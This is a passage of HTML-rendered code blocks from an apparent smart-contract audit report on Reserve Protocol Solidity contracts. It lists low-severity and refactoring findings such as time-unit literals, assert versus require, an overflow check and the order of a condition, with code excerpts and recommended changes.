class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">720</span><span class=\"mtk1\">:        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">721</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">totalStakes</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">722</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">723</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">account</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">724</span><span class=\"mtk1\">;        </span><span class=\"mtk11\">_afterTokenTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">account</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">725</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<p>As you can see in the below instance, everytime the address given to the _mint and _burn functions will be the msg.sender of stake and unstake:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"89\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StRSR</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">212</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">stake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rsrAmount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">228</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">account</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">229</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">stakeRSR</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">rsrAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">230</span><span class=\"mtk1\">:  </span><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">account</span><span class=\"mtk1\">, </span><span class=\"mtk12\">stakeAmount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"90\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StRSR</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">257</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">unstake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stakeAmount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">notPausedOrFrozen</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">258</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">account</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">267</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">_burn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">account</span><span class=\"mtk1\">, </span><span class=\"mtk12\">stakeAmount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<h2 id=\"r-01-numeric-values-having-to-do-with-time-should-use-time-units-for-readability\" style=\"position:relative;\"><a href=\"#r-01-numeric-values-having-to-do-with-time-should-use-time-units-for-readability\" aria-label=\"r 01 numeric values having to do with time should use time units for readability permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[R-01] Numeric values having to do with time should use time units for readability</h2>\n<p>Suffixes like seconds, minutes, hours, days and weeks after literal numbers can be used to specify units of time where seconds are the base unit and units are considered naively in the following way:</p>\n<p><code>1 == 1 seconds</code><br>\n<code>1 minutes == 60 seconds</code><br>\n<code>1 hours == 60 minutes</code><br>\n<code>1 days == 24 hours</code><br>\n<code>1 weeks == 7 days</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"91\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BackingManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">33</span><span class=\"mtk1\">: </span><span class=\"mtk12\">uint48</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MAX_TRADING_DELAY</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">31536000</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// {s} 1 year</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Broker</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">24</span><span class=\"mtk1\">: </span><span class=\"mtk12\">uint48</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MAX_AUCTION_LENGTH</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">604800</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// {s} max valid duration - 1 week</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Furnace</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">16</span><span class=\"mtk1\">: </span><span class=\"mtk12\">uint48</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MAX_PERIOD</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">31536000</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// {s} 1 year</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StRSR</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">37</span><span class=\"mtk1\">: </span><span class=\"mtk12\">uint48</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MAX_UNSTAKING_DELAY</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">31536000</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// {s} 1 year</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">38</span><span class=\"mtk1\">: </span><span class=\"mtk12\">uint48</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MAX_REWARD_PERIOD</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">31536000</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// {s} 1 year</span></span></span></code></pre>\n<h2 id=\"r-02-use-require-instead-of-assert\" style=\"position:relative;\"><a href=\"#r-02-use-require-instead-of-assert\" aria-label=\"r 02 use require instead of assert permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[R-02] Use require instead of assert</h2>\n<p>The Solidity assert() function is meant to assert invariants.</p>\n<p>Properly functioning code should never reach a failing assert statement.</p>\n<p>Instances:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"92\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">mixins</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RecollateralizationLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">110</span><span class=\"mtk1\">: </span><span class=\"mtk11\">assert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">doTrade</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">mixins</span><span class=\"mtk1\">/</span><span class=\"mtk12\">RewardableLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">78</span><span class=\"mtk1\">: </span><span class=\"mtk11\">assert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">erc20s</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)) &gt;= </span><span class=\"mtk12\">liabilities</span><span class=\"mtk1\">[</span><span class=\"mtk12\">erc20s</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">]]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">102</span><span class=\"mtk1\">: </span><span class=\"mtk11\">assert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">erc20</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">)) &gt;= </span><span class=\"mtk12\">liabilities</span><span class=\"mtk1\">[</span><span class=\"mtk12\">erc20</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">mixins</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TradeLib</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">44</span><span class=\"mtk1\">: </span><span class=\"mtk11\">assert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">buyPrice</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">buyPrice</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">FIX_MAX</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">trade</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sellPrice</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">FIX_MAX</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">108</span><span class=\"mtk1\">: </span><span class=\"mtk12\">assert</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">168</span><span class=\"mtk1\">: </span><span class=\"mtk11\">assert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">errorCode</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0x11</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">errorCode</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0x12</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">170</span><span class=\"mtk1\">: </span><span class=\"mtk11\">assert</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">reason</span><span class=\"mtk1\">) == </span><span class=\"mtk12\">UIntOutofBoundsHash</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BackingManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">249</span><span class=\"mtk1\">: </span><span class=\"mtk11\">assert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tradesOpen</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; !</span><span class=\"mtk12\">basketHandler</span><span class=\"mtk1\">.</span><span class=\"mtk11\">fullyCollateralized</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BasketHandler</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">556</span><span class=\"mtk1\">: </span><span class=\"mtk11\">assert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">targetIndex</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">targetsLength</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">StRSR</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">696</span><span class=\"mtk1\">: </span><span class=\"mtk11\">assert</span><span class=\"mtk1\">(</span><span class=\"mtk12\">totalStakes</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint224</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Recommended: Consider whether the condition checked in the assert() is actually an invariant.</p>\n<p>If not, replace the assert() statement with a require() statement.</p>\n<h2 id=\"r-03-unnecessary-overflow-check-can-be-rafactored-in-a-better-way\" style=\"position:relative;\"><a href=\"#r-03-unnecessary-overflow-check-can-be-rafactored-in-a-better-way\" aria-label=\"r 03 unnecessary overflow check can be rafactored in a better way permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[R-03] Unnecessary overflow check can be rafactored in a better way</h2>\n<p>In the function <code>quantityMulPrice</code> an unchecked code is made, where the local variable <code>rawDelta</code> is calculated and after that an if statement is created, where is check if <code>rawDelta</code> overflows. This check won’t be needed if we just move the variable above the unchecked block, so it will revert if this ever happens.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"93\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">p1</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BasketHandler</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">356</span><span class=\"mtk1\">: </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">quantityMulPrice</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint192</span><span class=\"mtk1\"> </span><span class=\"mtk12\">qty</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint192</span><span class=\"mtk1\"> </span><span class=\"mtk12\">p</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint192</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">365</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">366</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// p and mul *are* Fix values, so have 18 decimals (D18)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">367</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rawDelta</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">p</span><span class=\"mtk1\">) * </span><span class=\"mtk12\">qty</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// {D36} = {D18} * {D18}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">368</span><span class=\"mtk1\">:            </span><span class=\"mtk3\">// if we overflowed *, then return FIX_MAX</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">369</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">rawDelta</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">p</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">qty</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">FIX_MAX</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>The instance above can be refactored to:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"94\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">356</span><span class=\"mtk1\">: </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">quantityMulPrice</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint192</span><span class=\"mtk1\"> </span><span class=\"mtk12\">qty</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint192</span><span class=\"mtk1\"> </span><span class=\"mtk12\">p</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint192</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// rawDelta is moved above the unchecked block and reverts if overflows</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">364</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rawDelta</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">p</span><span class=\"mtk1\">) * </span><span class=\"mtk12\">qty</span><span class=\"mtk1\">; </span><span class=\"mtk3\">// {D36} = {D18} * {D18}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">365</span><span class=\"mtk1\">:  </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {          </span></span></span></code></pre>\n<h2 id=\"r-04-if-statement-should-check-first-if-the-status-is-disabled\" style=\"position:relative;\"><a href=\"#r-04-if-statement-should-check-first-if-the-status-is-disabled\" aria-label=\"r 04 if statement should check first if the status is disabled permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[R-04] If statement should check first, if the status is disabled</h2>\n<p>The if statement in the function <code>basketsHeldBy</code> check first if basket’s length equals zero and then checks if the basket is invalid and disabled. Consider first checking if the staus is disabled and then if the length equals zero.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"95\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">432</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">basketsHeldBy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">account</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint192</span><span class=\"mtk1\"> </span><span class=\"mtk12\">baskets</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">433</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">length</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">basket</span><span class=\"mtk1\">.</span><span class=\"mtk12\">erc20s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">434</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">disabled</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">FIX_ZERO</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>Refactor the instance above to:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"96\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">432</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">basketsHeldBy</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">account</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span 